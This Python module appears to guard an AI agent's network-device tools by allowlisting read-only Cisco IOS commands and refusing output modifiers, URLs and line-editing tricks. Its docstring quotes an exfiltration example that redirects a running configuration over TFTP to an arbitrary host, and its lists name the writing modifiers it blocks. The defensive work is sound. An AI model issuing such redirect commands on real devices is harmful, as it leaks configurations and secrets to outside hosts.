"""Read-only device commands: ONE allowlist for every free-text path (C61).

A command is read-only when EVERY part of it is, not when its first word is.
The first version of this check (P.3 step 8) looked at the verb alone, and
IOS output modifiers write: ``| redirect <url>``, ``| tee <url>`` and
``| append <url>`` send a command's output to ``flash:`` or to another host.
So ``show running-config | redirect tftp://<host>/x`` passed as "a show
command", and sent a device's whole configuration, secrets included, to an
arbitrary host. The DEVICE was the exfiltration path, so nothing in the tool
saw it: the provider-boundary redaction never touched those bytes. That is
B13's shape (a secret leaving through a path the gate did not examine).

So both halves are allowlists, which a command added to IOS later cannot
outgrow:
- the VERB: show, ping, traceroute, dir, more;
- the OUTPUT MODIFIER after the first ``|``: begin, count, exclude,
  include, section, and their unambiguous abbreviations. Anything else is
  refused.

**What follows the modifier is its regular expression, measured**
(2026-09-27, IOS-XE 17.6 and vIOS 15.2, `tests/fixtures/operational/`):
``show version | include Cisco | count`` prints the matching lines, not a
count, on both. So a later ``|`` is regex alternation there, and the
pipeline's own ``show interfaces | include (line protocol|Internet address)``
is a read. The first version of this module split on every ``|`` and refused
that read. A later segment is refused only when its first word could name a
modifier that is not a filter (``| include a|redirect x``): harmless here,
and a write on any platform that does chain pipes, so it fails closed.

Also refused, because each makes a "read" do something else:
- a URL anywhere (``://``): the device reaching another host, in either
  direction;
- ``ping`` or ``traceroute`` with no target: the extended dialogue asks
  questions, and the answers would arrive as the next "commands";
- a line break, a control character or ``?``: each is line editing, and
  can leave a partial command at the device's prompt for the next line to
  complete.

**Read-only is not "changes nothing" in every sense, and this list keeps the
difference visible:** ``clear`` and ``debug`` are exec commands that change
state (``clear ip ospf process`` drops adjacencies, ``clear counters`` erases
the evidence a diagnosis reads, ``debug`` loads the device) and are NOT here
(NSOT_FEATURE_AUDIT 3a).

Used by the agent's ``execute_*`` tools, and as a REFUSAL by ``/run_command`` and
``bulk_execute`` (C570, 2026-10-08: they had used it only to decide whether to hold the device,
and then ran anything; ``tests/test_device_text_is_refused.py``). The connection layer's guard
(``connection._guard_writes``) refuses any unheld non-read on every session besides.
"""

import logging

log = logging.getLogger(__name__)

READ_ONLY_VERBS = ("show", "sho", "sh", "ping", "traceroute", "dir", "more")

#: Output modifiers that only filter what is displayed.
SAFE_MODIFIERS = ("begin", "count", "exclude", "include", "section")

#: Modifiers IOS offers that are not filters. Listed so an abbreviation that
#: could mean one of them is refused, and so the refusal can say why. The
#: refusal itself is decided by SAFE_MODIFIERS: an unknown word is refused too.
OTHER_MODIFIERS = ("append", "format", "redirect", "tee")
WRITING_MODIFIERS = ("append", "redirect", "tee")

TARGET_VERBS = ("ping", "traceroute")

_TAIL = ("Only show, ping, traceroute, dir or more run here, filtered only by "
         "include, exclude, begin, section or count. A change is a plan a "
         "person confirms.")


def _modifier_is_safe(word: str) -> bool:
    """An unambiguous prefix of a filtering modifier, and of nothing else."""
    word = word.lower()
    if not any(m.startswith(word) for m in SAFE_MODIFIERS):
        return False
    return not any(m.startswith(word) for m in OTHER_MODIFIERS)


def refusal(command) -> str:
    """A refusal naming the reason, or "" when *command* is read-only."""
    text = command if isinstance(command, str) else ""
    if "\n" in text or "\r" in text:
        return f"REFUSED: one command per entry, no line breaks: {text[:60]!r}"
    if any(ord(c) < 32 or ord(c) == 127 for c in text):
        return "REFUSED: a control character is line editing, not a command."
    stripped = text.strip()
    if not stripped:
        return f"REFUSED: '(empty)' is not a read-only command. {_TAIL}"
    if "?" in stripped:
        return ("REFUSED: '?' is the CLI's inline help; it leaves a partial "
                "command at the prompt for the next line to complete.")
    head, *modifiers = stripped.split("|")
    words = head.split()
    verb = words[0].lower() if words else ""
    if verb not in READ_ONLY_VERBS:
        return f"REFUSED: {verb or '(empty)'!r} is not a read-only command. {_TAIL}"
    if "://" in stripped:
        return ("REFUSED: a URL makes the device reach another host, so this is "
                "not a read of this device.")
    if verb in TARGET_VERBS:
        args = words[1:]
        if len(args) >= 2 and args[0].lower() == "vrf":
            args = args[2:]
        if not args:
            return (f"REFUSED: {verb} with no target starts an interactive "
                    "dialogue; give the address.")
    for position, modifier in enumerate(modifiers):
        parts = modifier.split()
        word = parts[0] if parts else ""
        if not word:
            return "REFUSED: an empty output modifier after '|'."
        could_be_other = any(m.startswith(word.lower()) for m in OTHER_MODIFIERS)
        if position == 0 and _modifier_is_safe(word):
            continue
        if position > 0 and not could_be_other:
            continue    # part of the filter's regular expression
        writes = any(m.startswith(word.lower()) for m in WRITING_MODIFIERS)
        why = (" It WRITES the output to a file or another host." if writes
               else "")
        return (f"REFUSED: output modifier {word!r} is not a filter.{why} "
                f"{_TAIL}")
    return ""


def refusal_for(commands) -> str:
    """The first refusal among *commands*, or "" when all are read-only."""
    for command in commands or []:
        reason = refusal(command)
        if reason:
            return reason
    return ""
